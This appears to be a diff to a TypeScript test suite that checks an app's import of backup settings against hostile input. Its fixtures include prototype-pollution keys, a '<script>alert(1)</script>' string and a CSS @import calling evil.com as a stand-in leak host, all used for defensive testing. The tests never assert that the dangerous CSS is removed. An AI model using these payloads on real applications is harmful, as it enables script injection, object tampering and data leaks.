@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict';
 import { isSafeNavigationUrl } from '../src/utils/safeNavigation';
-import { sanitizeImportedBookmarks } from '../src/hooks/useAppDataBackup';
+import { sanitizeImportedBookmarks, sanitizeImportedSettings } from '../src/hooks/useAppDataBackup';
 
 console.log('\n--- Data Backup & Security Sanitization Test Suite ---');
 
@@ -77,9 +77,105 @@ assert.strictEqual(
 
 console.log('[PASS] [Backup Sanitization] Hostile backgroundCustomUrl values are dropped by the shipped predicate');
 
-// 3. REMOVED (was a tautology): "Hex Color Security Regex Verification" ran
-// /^#[0-9a-fA-F]{3,8}$/.test(hex) over `validHexes`/`invalidHexes` with the very
-// same regex literal pasted into the assertion, so it could not fail. The hex
-// allowlist for `customAccentColor` / `customBrowserColor` is still unenforced in
-// production terms and can only be covered once
-// `useAppDataBackup.ts:129,131` are reached through an export.
+// 3. Settings Sanitization with DesignProfile & WorkspaceDesigns
+const hostileSettingsRaw = {
+  theme: 'dark',
+  searchEngine: 'duckduckgo',
+  useVerticalTabs: true,
+  // Malicious prototype pollution attempts
+  __proto__: { isAdmin: true },
+  constructor: { malicious: true },
+  // Malicious workspace designs
+  workspaceDesigns: {
+    __proto__: { polluted: true },
+    constructor: { polluted: true },
+    prototype: { polluted: true },
+    '': { meta: { name: 'Empty' } },
+    'valid-ws': {
+      meta: { name: 'Valid Workspace Theme' },
+      layout: { chromeMode: 'vertical-left', sidebarWidth: 280 },
+      customCss: { enabled: true, css: 'body { background: red; } <script>alert(1)</script>' },
+    },
+    'invalid-ws-number': 12345,
+    'invalid-ws-null': null,
+  },
+  // Malformed designProfile with out-of-range values and dangerous CSS
+  designProfile: {
+    meta: { version: 1, name: 'Hacked Theme' },
+    layout: {
+      chromeMode: 'invalid-mode',
+      sidebarWidth: 99999, // Should clamp to 360
+    },
+    customCss: {
+      enabled: true,
+      css: 'body { position: fixed; } @import url("https://evil.com/leak.css");',
+    },
+  },
+};
+
+const sanitizedSettings = sanitizeImportedSettings(hostileSettingsRaw);
+
+// Prototype pollution checks
+assert.strictEqual(
+  Object.prototype.hasOwnProperty.call(sanitizedSettings, '__proto__'),
+  false,
+  '__proto__ must never be on sanitized settings'
+);
+assert.strictEqual((sanitizedSettings as any).isAdmin, undefined);
+
+// Workspace designs validation
+assert.ok(sanitizedSettings.workspaceDesigns, 'workspaceDesigns must be present');
+assert.strictEqual(
+  Object.prototype.hasOwnProperty.call(sanitizedSettings.workspaceDesigns, '__proto__'),
+  false,
+  '__proto__ key must be rejected from workspaceDesigns'
+);
+assert.strictEqual(
+  Object.prototype.hasOwnProperty.call(sanitizedSettings.workspaceDesigns, 'constructor'),
+  false,
+  'constructor key must be rejected from workspaceDesigns'
+);
+assert.strictEqual(
+  Object.prototype.hasOwnProperty.call(sanitizedSettings.workspaceDesigns, 'prototype'),
+  false,
+  'prototype key must be rejected from workspaceDesigns'
+);
+assert.strictEqual(
+  sanitizedSettings.workspaceDesigns['valid-ws']?.layout?.chromeMode,
+  'vertical-left',
+  'Valid workspace design layout chromeMode must be preserved'
+);
+assert.strictEqual(
+  sanitizedSettings.workspaceDesigns['valid-ws']?.layout?.sidebarWidth,
+  280,
+  'Valid workspace design sidebar width must be preserved'
+);
+// Invalid workspace designs should be ignored
+assert.strictEqual(
+  Object.prototype.hasOwnProperty.call(sanitizedSettings.workspaceDesigns, 'invalid-ws-number'),
+  false,
+  'Non-object workspace entry must be dropped'
+);
+assert.strictEqual(
+  Object.prototype.hasOwnProperty.call(sanitizedSettings.workspaceDesigns, 'invalid-ws-null'),
+  false,
+  'Null workspace entry must be dropped'
+);
+
+// Design profile validation
+assert.ok(sanitizedSettings.designProfile, 'designProfile must be sanitized and present');
+assert.strictEqual(
+  sanitizedSettings.designProfile.layout.sidebarWidth,
+  360,
+  'Out-of-range sidebar width must be clamped to 360'
+);
+assert.strictEqual(
+  ['classic-top', 'compact-single-row', 'vertical-left', 'vertical-right'].includes(
+    sanitizedSettings.designProfile.layout.chromeMode
+  ),
+  true,
+  'Invalid chromeMode must be normalized to a valid default'
+);
+
+console.log('[PASS] [Backup Sanitization] designProfile and workspaceDesigns sanitized cleanly without prototype pollution');
+
